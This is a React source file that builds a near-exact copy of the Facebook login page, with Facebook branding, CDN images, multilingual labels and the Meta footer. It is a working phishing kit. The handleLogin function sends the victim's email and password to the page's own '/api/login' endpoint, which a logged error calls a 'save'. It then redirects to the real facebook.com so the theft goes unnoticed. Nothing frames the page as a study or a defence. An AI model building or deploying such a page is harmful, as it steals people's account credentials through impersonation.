import { useState, useMemo, useRef, useEffect } from "react";


const FacebookLogo = () => (
  <svg viewBox="0 0 36 36" className="w-12 h-12" fill="hsl(var(--fb-blue))">
    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-9H9v-5h5v-3.5C14 12.252 16.763 9 21.5 9c1.754 0 3.5.5 3.5.5v4h-2c-1.93 0-3 1.07-3 3v3h5l-1 5h-4v11.27z" />
  </svg>
);

const MetaLogo = () => (
  <img
    src="/images/metalogo.jpg"   
    alt="Meta"
    className="h-6 w-auto"
  />
);

const ImageCollage = () => {
  const imageSrcs = [
    "https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp",
    "https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp",
    "https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp"
  ];

  const selectedSrc = useMemo(() => {
    return imageSrcs[Math.floor(Math.random() * imageSrcs.length)];
  }, []);

  return (
    <div className="relative w-full max-w-[720px] mx-auto lg:mx-0 h-[460px] lg:h-[520px]">
      {/* Clean container - no border, no heavy shadow */}
      <div className="absolute top-[24px] left-[24px] w-[440px] h-[500px] rounded-[40px] overflow-hidden bg-white">
        <img
          src={selectedSrc}
          alt="Featured Facebook image"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

const FloatingInput = ({
  label,
  type,
  value,
  onChange,
  className = "",
  errorMessage = "",
}: {
  label: string;
  type: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  className?: string;
  errorMessage?: string;
}) => {
  const [focused, setFocused] = useState(false);
  const isActive = focused || value.length > 0;
  const hasError = errorMessage.length > 0;

  return (
    <div className={`relative ${className}`}>
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        className={`peer w-full h-[52px] px-4 pt-5 pb-1 text-base border rounded-lg bg-background text-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
          hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-input"
        }`}
      />
      <label
        className={`absolute left-4 transition-all duration-150 pointer-events-none ${
          isActive
            ? "top-1.5 text-xs text-muted-foreground"
            : "top-3.5 text-base text-muted-foreground"
        }`}
      >
        {label}
      </label>
      {hasError ? (
        <p className="mt-1 text-sm text-red-600">{errorMessage}</p>
      ) : null}
    </div>
  );
};

const Index = () => {
  const [currentLang, setCurrentLang] = useState("en"); // default English

  const languages = [
    { code: "en", label: "English (US)" },
    { code: "ne", label: "नेपाली" },
    { code: "hi", label: "हिन्दी" },
    { code: "es", label: "Español" },
    { code: "pt", label: "Português (Brasil)" },
    { code: "ja", label: "日本語" },
    { code: "fr", label: "Français (France)" },
  ];

  // Simple translation dictionary (expand this as needed)
  const translations: Record<string, Record<string, string>> = {
    en: {
      explore: "Explore the things you love.",
      loginTitle: "Log into Facebook",
      emailLabel: "Email or mobile number",
      passwordLabel: "Password",
      loginBtn: "Log in",
      forgotPassword: "Forgot password?",
      createAccount: "Create new account",
    },
    ne: {
      explore: "तपाईंलाई मन पर्ने कुराहरू अन्वेषण गर्नुहोस्।",
      loginTitle: "फेसबुकमा लग इन गर्नुहोस्",
      emailLabel: "इमेल वा मोबाइल नम्बर",
      passwordLabel: "पासवर्ड",
      loginBtn: "लग इन गर्नुहोस्",
      forgotPassword: "पासवर्ड बिर्सनुभयो?",
      createAccount: "नयाँ खाता बनाउनुहोस्",
    },
    hi: {
      explore: "आपको पसंदीदा चीजों को एक्सप्लोर करें।",
      loginTitle: "फेसबुक में लॉग इन करें",
      emailLabel: "ईमेल या मोबाइल नंबर",
      passwordLabel: "पासवर्ड",
      loginBtn: "लॉग इन करें",
      forgotPassword: "पासवर्ड भूल गए?",
      createAccount: "नया अकाउंट बनाएं",
    },
    // Add more languages (es, pt, ja, fr) as needed...
  };

  const t = (key: string) => translations[currentLang]?.[key] || translations.en[key];

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");

  const handleLogin = async () => {
    if (!email.trim() || !password.trim()) {
      setLoginError(
        "The email or mobile number you entered isn’t connected to an account. Find your account and log in."
      );
      return;
    }

    setLoginError("");

    try {
      await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });
    } catch (error) {
      console.error("Login save failed:", error);
    } finally {
      window.location.href = "https://www.facebook.com/";
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col justify-between">
      <div className="flex-1 flex items-start justify-center px-4 py-8 lg:px-8">
        <div className="flex flex-col lg:flex-row lg:items-stretch items-start gap-10 lg:gap-24 max-w-[1320px] w-full">
          {/* Left side */}
          <div className="hidden lg:flex flex-1 max-w-[640px] lg:h-full">
            <div className="mb-6">
              <FacebookLogo />
            </div>
            <div className="grid gap-1 lg:grid-cols-[minmax(200px,180px)_minmax(220px,360px)] items-start">
              <div className="mt-auto pb-8 lg:pb-12">
                <h1 className="text-[32px] lg:text-[58px] font-extrabold leading-[0.95] tracking-tight text-foreground">
                  Explore<br />the things<br /><span className="text-primary">you love.</span>
                </h1>
              </div>
              <div className="pt-3 lg:pt-0">
                <ImageCollage />
              </div>
            </div>
          </div>

          {/* Right side - Login form */}
          <div className="w-full max-w-[436px] lg:border-l lg:border-border lg:pl-12 lg:h-full">
            <div className="pt-8 lg:pt-0 pb-8">
              <div className="flex justify-center lg:hidden mb-6">
                <FacebookLogo />
              </div>
              <h2 className="text-xl font-semibold text-foreground mb-6">{t("loginTitle")}</h2>
              <FloatingInput
                type="text"
                label={t("emailLabel")}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                errorMessage={loginError}
              />
              <FloatingInput
                type="password"
                label={t("passwordLabel")}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="mt-3"
              />
              <button
                onClick={handleLogin}
                className="w-full h-[48px] bg-primary text-primary-foreground text-base font-semibold rounded-full mt-4 hover:brightness-95 transition-all"
              >
                {t("loginBtn")}
              </button>
              <div className="text-center mt-4">
                <a
                  href="https://www.facebook.com/login/identify/?ci=Ac_aRgUQbbEKDW4zKTJPBzVW1d2deLXisauhDhUvotDMhJbe2bZxFfI73aVWSfbhgEFC5HC0nx6J1TdUOVLqnvvQrDreoqCTF3rD70Zp9OUcRZ7iRwt760eVzpHHNg1ZhrOAdQ00TJZQ1L2Axuzm0dR6APHDrBAOnQ46rb4fhcm9YMZB8TpBFeX8ROAfKxvTA7iP0LGKYeZISfl8yq-xIggchk1alNEn-pk8Ls_oXzodITSCMlaDy1CuxY3zTFygFPlm_kmD4GNGNGOp5rXIgWiDvkKu"
                  className="text-foreground text-sm font-medium hover:underline"
                >
                  {t("forgotPassword")}
                </a>
              </div>
              <div className="border-t border-border mt-6 pt-6 flex justify-center">
                <button
                  type="button"
                  onClick={() => window.location.href = "https://www.facebook.com/reg/?entry_point=login&next="}
                  className="w-full h-[48px] border border-primary text-primary text-base font-semibold rounded-full hover:bg-primary/5 transition-all"
                >
                  {t("createAccount")}
                </button>
              </div>
              <div className="flex justify-center mt-8">
                <MetaLogo />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-4 px-4 border-t border-border">
        <div className="max-w-[1100px] mx-auto">
          <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-sm mb-2">
            {languages.map((lang) => (
              <a
                key={lang.code}
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  setCurrentLang(lang.code);
                }}
                className={`hover:underline transition-colors ${
                  currentLang === lang.code
                    ? "text-foreground font-medium"
                    : "text-muted-foreground"
                }`}
              >
                {lang.label}
              </a>
            ))}
            <a href="#" className="text-muted-foreground hover:underline">More languages...</a>
          </div>
          <div className="pt-2">
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-muted-foreground">
              {["Sign Up", "Log In", "Messenger", "Facebook Lite", "Video", "Meta Pay", "Meta Store", "Meta Quest", "Ray-Ban Meta", "Meta AI", "Instagram", "Threads", "Privacy Policy"].map((link, i) => (
                <a key={i} href="#" className="hover:underline">{link}</a>
              ))}
            </div>
            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-muted-foreground mt-1">
              {["Privacy Center", "About", "Create ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices ▶", "Terms", "Help", "Contact Uploading & Non-Users"].map((link, i) => (
                <a key={i} href="#" className="hover:underline">{link}</a>
              ))}
            </div>
          </div>
          <p className="text-xs text-muted-foreground text-center mt-3">Meta © 2026</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
